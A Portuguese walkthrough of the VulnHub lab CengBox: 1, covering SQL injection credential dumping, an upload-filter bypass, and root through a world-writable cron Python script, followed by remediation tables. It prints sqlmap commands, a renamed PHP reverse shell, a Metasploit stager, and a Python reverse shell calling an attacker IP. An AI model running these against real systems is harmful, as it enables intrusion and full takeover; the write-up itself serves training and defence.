# CengBox: 1

O filtro de upload dizia "sem PHP permitido", entao a gente entregou um arquivo `.ceng`. Foi so isso, mano. CengBox: 1 e uma maquina de nivel facil que te guia por uma cadeia enxuta de quatro passos: SQLi despeja credenciais admin, um filtro de upload baseado em blacklist e bypassado com a shell renomeada, e um script Python pertencente ao root rodando num cron com permissao de escrita para todos te entrega o root sem suor. Box simples, licoes reais e muito relevantes.

---

| Campo | Valor |
|---|---|
| **Nivel** | Facil |
| **VM Alvo** | CengBox: 1 (Linux, 192.168.1.106) |
| **VM Atacante** | Kali Linux 192.168.1.112 |
| **VulnHub URL** | https://www.vulnhub.com/entry/cengbox-1,475/ |
| **Tecnicas** | Scan de portas, brute force de diretorios, injecao SQL, bypass de filtro de upload, hijack de script Python no cron |
| **CVEs / EDBs** | Sem CVE atribuido (SQLi generico + bypass de upload); misconfiguracoes tipo EDB |
| **Grupos APT** | APT41 (exploracao de app web para acesso inicial), FIN7 (deploi de webshell via upload) |

---

## Resumo do Ataque

```
[nmap] ---> porta 80 (Apache)
             |
             v
[dirb big.txt] ---> /uploads, /masteradmin
             |
             v
[dirb .php em /masteradmin] ---> login.php, upload.php
             |
             v
[sqlmap --forms] ---> dump cengbox DB ---> masteradmin:C3ng0v3R00T1!
             |
             v
[login.php] ---> painel admin autenticado
             |
             v
[upload.php] ---> .php rejeitado ---> renomeia para .ceng ---> uploaded
             |
             v
[nc -lvp 1234] ---> acessar /uploads/shell.ceng ---> reverse shell
             |
             v
[su cengover] ---> C3ng0v3R00T1! ---> user.txt
             |
             v
[pspy64] ---> UID=0 executando /home/cengover/md5check.py
             |
             v
[echo stager MSF > md5check.py] ---> cron dispara ---> Meterpreter root
```

---

## Metodologia

1. Descoberta de rede e scan de portas
2. Brute force de diretorios para localizar painel admin e diretorio de upload
3. Injecao SQL no formulario de login admin para extrair credenciais
4. Bypass do filtro de upload via renomeacao de extensao (.php para .ceng)
5. Estabilizacao da reverse shell e movimentacao lateral via reuso de credenciais
6. Monitoramento de processos com pspy para identificar script Python agendado pelo root
7. Substituicao do script Python por stager Metasploit para Meterpreter root

---

## Passo 1: Descoberta de Rede e Scan de Portas

**Contexto:** IP alvo conhecido na rede host-only (192.168.1.106). Confirmando servicos abertos.

```bash
sudo netdiscover
nmap -p- -A 192.168.1.106
```

**Saida esperada (resumida):**
```
80/tcp  open  http  Apache httpd 2.x
```

Apenas porta 80 aberta. Servidor Apache confirmado.

**Alternativa:** `masscan -p1-65535 192.168.1.106 --rate=1000` para sweep completo mais rapido.

**Nota real:** Exposicao de servico unico nao significa superficie de ataque unica. Apps web na porta 80 podem encadear multiplas vulnerabilidades em comprometimento total do sistema, como essa box demonstra.

**TTP MITRE:** T1046 - Network Service Scanning

---

## Passo 2: Enumeracao de Diretorios

**Contexto:** Pagina web padrao exibida na porta 80. Preciso descobrir diretorios ocultos e endpoints da aplicacao.

```bash
dirb http://192.168.1.106/ /usr/share/wordlists/big.txt
# Encontrado: /uploads, /masteradmin

dirb http://192.168.1.106/masteradmin -X .php
# Encontrado: /masteradmin/login.php, /masteradmin/upload.php
```

**Alternativa:** `gobuster dir -u http://192.168.1.106/masteradmin -x php,html,txt -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt`

**Nota real:** Um diretorio chamado `/masteradmin` nao e obscuridade. Seguranca por obscuridade nao e seguranca, véi. Qualquer atacante rodando dirb ou gobuster vai encontrar isso em menos de um minuto.

**TTP MITRE:** T1083 - File and Directory Discovery

---

## Passo 3: Injecao SQL no Login Admin

**Contexto:** Formulario de login em `/masteradmin/login.php` nao aceita credenciais padrao. Hora do sqlmap.

```bash
sqlmap -u http://192.168.1.106/masteradmin/login.php --forms --dbs --batch
sqlmap -u http://192.168.1.106/masteradmin/login.php --forms \
  -D cengbox --dump-all --batch
```

**Saida esperada (resumida):**
```
Database: cengbox
Table: admin
| masteradmin | C3ng0v3R00T1! |
```

Credenciais obtidas:
- Usuario: `masteradmin`
- Senha: `C3ng0v3R00T1!`

**Alternativa:** Teste manual de SQLi primeiro: tentar `' OR 1=1-- -` no campo usuario. Se a app logar, nao precisa do sqlmap.

**Nota real:** SQLi em formularios de login de admin e um achado classico de pentest que ainda aparece em avaliacoes de producao. Queries parametrizadas existem ha mais de 20 anos e desenvolvedores ainda ignoram isso. FIN7 utilizou exatamente esse vetor de ataque contra alvos de varejo e hospitalidade.

**TTP MITRE:** T1190 - Exploit Public-Facing Application

---

## Passo 4: Bypass do Filtro de Upload

**Contexto:** Autenticado no painel admin. O endpoint de upload em `upload.php` bloqueia arquivos `.php`. Esse e um filtro baseado em blacklist, que por natureza e bypassavel.

```bash
cp /usr/share/webshells/php/php-reverse-shell.php shell.ceng
# Editar shell.ceng: definir $ip = "192.168.1.112" e $port = 1234
```

Fazer upload de `shell.ceng` via painel admin em `/masteradmin/upload.php`.

Iniciar listener:

```bash
nc -lvp 1234
```

Acessar no browser:
```
http://192.168.1.106/uploads/shell.ceng
```

Reverse shell conecta de volta. Isso ai, mano!

Estabilizar a shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

**Alternativa:** Tentar outras extensoes nao-padrao: `.php5`, `.phtml`, `.phar`. O servidor precisa estar configurado para executa-las. Testar com `<?php phpinfo(); ?>` simples primeiro.

**Nota real:** Filtros de upload baseados em blacklist sao consistentemente bypassados em engajamentos reais. A abordagem correta e validacao baseada em whitelist: aceitar apenas tipos MIME especificos conhecidos como seguros, validar magic bytes e nunca executar arquivos do diretorio de upload. Esse achado aparece no OWASP A04:2021 (Insecure Design).

**TTP MITRE:** T1505.003 - Web Shell, T1190 - Exploit Public-Facing Application

---

## Passo 5: Movimentacao Lateral via Reuso de Credenciais

**Contexto:** Shell rodando como www-data ou conta equivalente de servico web. A senha do admin do banco de dados pode ter sido reutilizada.

```bash
su cengover
# Senha: C3ng0v3R00T1!
id
# uid=1000(cengover)
cat /home/cengover/user.txt
```

**Nota real:** Reuso de senha entre contas de sistema e contas de banco de dados e endemico. Desenvolvedores que montam paineis admin frequentemente usam a mesma senha para sua conta Linux. Sempre teste reuso de credenciais durante pos-exploracao, tá ligado?

**TTP MITRE:** T1078 - Valid Accounts, T1552.001 - Unsecured Credentials: Credentials in Files

---

## Passo 6: Escalada de Privilegios via Script Python Gravavel Executado pelo Root

**Contexto:** Preciso encontrar um caminho de escalada de privilegios a partir de `cengover`. Rodando pspy para monitorar execucao de processos sem acesso root.

Fazer upload e rodar `pspy64`:

```bash
cd /tmp
wget http://192.168.1.112/pspy64
chmod +x pspy64
./pspy64
```

**Saida relevante do pspy:**
```
2024/01/01 12:00:00 CMD: UID=0   PID=xxxx  | /usr/bin/python3 /home/cengover/md5check.py
```

O script `/home/cengover/md5check.py` roda como UID 0 (root) em agendamento. Verificar permissoes:

```bash
ls -la /home/cengover/md5check.py
# -rw-rw-rw- ... root root ... md5check.py
```

Gravavel por todos. Esse e o vetor de privesc, caramba.

Usar o Metasploit web delivery para gerar um stager Python:

```
msfconsole
use exploit/multi/script/web_delivery
set target 7      # Python
set lhost 192.168.1.112
set lport 6789
exploit
```

Copiar o one-liner gerado para o script Python:

```bash
echo 'exec(__import__("base64").b64decode("PAYLOAD_AQUI"))' > /home/cengover/md5check.py
```

Quando o root executar o script na proxima vez, uma sessao Meterpreter root abre.

```
meterpreter > getuid
# root
cat /root/root.txt
```

GG, vacilou feio.

**Alternativa:** Payload mais simples para o script Python que abre uma reverse shell sem Metasploit:

```python
import socket,subprocess,os
s=socket.socket()
s.connect(("192.168.1.112",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
```

**Nota real:** Scripts graveis executados pelo root via cron sao uma misconfiguracao critica. Esse padrao aparece em sistemas de producao onde um desenvolvedor escreveu um script de manutencao e definiu permissoes amplas demais. Combinado com cron, e um caminho trivial para comprometimento total. O fix e simples: `chown root:root /home/cengover/md5check.py && chmod 700 /home/cengover/md5check.py`.

**TTP MITRE:** T1053.003 - Scheduled Task/Job: Cron, T1059.006 - Command and Scripting Interpreter: Python, T1548 - Abuse Elevation Control Mechanism

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Fonte |
|---|---|---|
| Credenciais admin | `masteradmin:C3ng0v3R00T1!` | Dump SQLMap do banco `cengbox` |
| Credenciais movimentacao lateral | `cengover:C3ng0v3R00T1!` | Reuso de credenciais |
| Flag de usuario | Ver /home/cengover/user.txt | Apos `su cengover` |
| Flag root | Ver /root/root.txt | Meterpreter root via md5check.py |

---

## Licoes Aprendidas

| Achado | Impacto | Relevancia no Mundo Real |
|---|---|---|
| Injecao SQL no formulario de login admin | Dump de credenciais admin via ferramenta automatizada em segundos | Queries parametrizadas existem ha 20 anos; apps ainda sao deploiadas sem elas |
| Validacao de upload apenas por blacklist | Execucao de shell PHP via extensao renomeada (.ceng) | Validacao por whitelist de tipo MIME e verificacao de magic bytes teria bloqueado isso completamente |
| Reuso de senha entre DB e contas Linux | Movimentacao lateral sem exploracao adicional | Gerenciadores de senha e credenciais unicas por servico previnem esse pivot trivial |
| Script Python gravavel executado pelo root via cron | Escalada trivial de privilegios para root | Scripts cron devem ser de propriedade e graveis apenas pelo root; auditorias regulares de permissoes detectam isso |
| pspy habilita descoberta de processos sem root | Revela processos agendados pelo root para atacantes sem privilegios | Defensores devem monitorar execucao do pspy (execucao de binario estatico em /tmp) como indicador de reconhecimento de escalada de privilegios |

---

## Mapeamento MITRE ATT&CK

| Tecnica | ID | Tatica |
|---|---|---|
| Exploit Public-Facing Application | T1190 | Initial Access |
| Web Shell | T1505.003 | Persistence |
| Valid Accounts | T1078 | Lateral Movement |
| Command and Scripting Interpreter: Python | T1059.006 | Execution |
| Scheduled Task/Job: Cron | T1053.003 | Privilege Escalation |
| Abuse Elevation Control Mechanism | T1548 | Privilege Escalation |
| Network Service Scanning | T1046 | Discovery |
| File and Directory Discovery | T1083 | Discovery |
| Unsecured Credentials: Credentials in Files | T1552.001 | Credential Access |
| Brute Force (SQLi automatizado) | T1110 | Credential Access |

---

## Remediacao

### NIST CSF 2.0

| Funcao | Controle | Acao |
|---|---|---|
| PR.DS-2 | Protecao de Dados em Transito | Impor HTTPS; remover paineis admin acessiveis apenas por HTTP |
| PR.AC-4 | Permissoes e Autorizacoes de Acesso | Restringir acesso ao painel admin a IPs confiados; implementar MFA |
| DE.CM-7 | Monitoramento para Atividade Nao Autorizada | Alertar em modificacao de cron jobs; monitorar eventos de escrita de arquivos em diretorios home de usuarios |
| ID.AM-2 | Gerenciamento de Ativos de Software | Inventariar todos os scripts customizados executados pelo cron; sinalizar aqueles com permissoes amplas |

### NIST SP 800-53

| Controle | Descricao |
|---|---|
| SI-10 | Validacao de Entrada de Informacoes (parametrizar todas as queries SQL) |
| SI-16 | Protecao de Memoria (validar e restringir uploads de arquivos por tipo MIME e magic bytes) |
| CM-6 | Definicoes de Configuracao (impor permissoes de menor privilegio em scripts cron) |
| AC-6 | Menor Privilegio (processo do servidor web nao deve ter acesso a diretorios home de usuarios) |
| AU-12 | Geracao de Registro de Auditoria (registrar todas as escritas de arquivo em caminhos de scripts executados pelo cron) |

### CISA KEV

Injecao SQL e bypass de upload de arquivo sao documentados em assessorias da CISA para numerosos produtos CMS e de aplicacao web. As classes de vulnerabilidade especificas aqui mapeiam para OWASP A03:2021 (Injection) e A04:2021 (Insecure Design). Escalada de privilegios baseada em cron via scripts graveis e documentada na orientacao da CISA sobre hardening Linux.

### C2M2 (Cybersecurity Capability Maturity Model)

| Dominio | Maturidade Atual | Maturidade Alvo | Lacuna |
|---|---|---|---|
| Gerenciamento de Ativos e Configuracoes | MIL0 (sem auditorias de permissao de scripts) | MIL2 | Implementar verificacoes automatizadas de baseline de permissoes em scripts executados pelo cron |
| Gerenciamento de Ameacas e Vulnerabilidades | MIL0 (sem revisao de codigo para SQLi) | MIL2 | Scanning SAST no CI/CD; testes de penetracao trimestrais |
| Gerenciamento de Identidade e Acesso | MIL1 (senhas basicas, sem MFA) | MIL2 | Impor MFA em paineis admin; credenciais unicas por servico |

### MITRE D3FEND

| Tecnica D3FEND | ID | Endereca |
|---|---|---|
| File Content Policies | D3-FCOP | Validar tipos MIME de upload e magic bytes |
| Process Spawn Analysis | D3-PSA | Detectar processos Python iniciados pelo cron com origem inesperada |
| Scheduled Job Analysis | D3-SJA | Monitorar definicoes de cron job e modificacoes de scripts agendados |
| Database Query String Analysis | D3-DQSA | Detectar padroes de injecao SQL em requisicoes de login admin |

---

## Consideracoes Finais

CengBox: 1 e uma box limpa e amigavel para iniciantes que nao precisa de tecnicas exoticas para rootar. A cadeia tem quatro passos: encontrar o painel admin, extrair credenciais com SQLi, bypassar o filtro de upload e deixar o pspy te dizer que o root esta literalmente executando seu script pra voce. Cada passo e um achado real e standalone que voce vai encontrar em testes de penetracao de verdade.

O bypass do filtro de upload e o passo mais instrutivo. O servidor bloqueou `.php` mas executou `.ceng` sem piscar. Esse e o problema classico da blacklist: voce so consegue enumerar o que acha que e perigoso. Defensores precisam inverter o modelo, colocar em whitelist apenas o que e seguro, nao blacklistar o que parece perigoso.

Thanks guys!! (❍ᴥ❍ʋ)
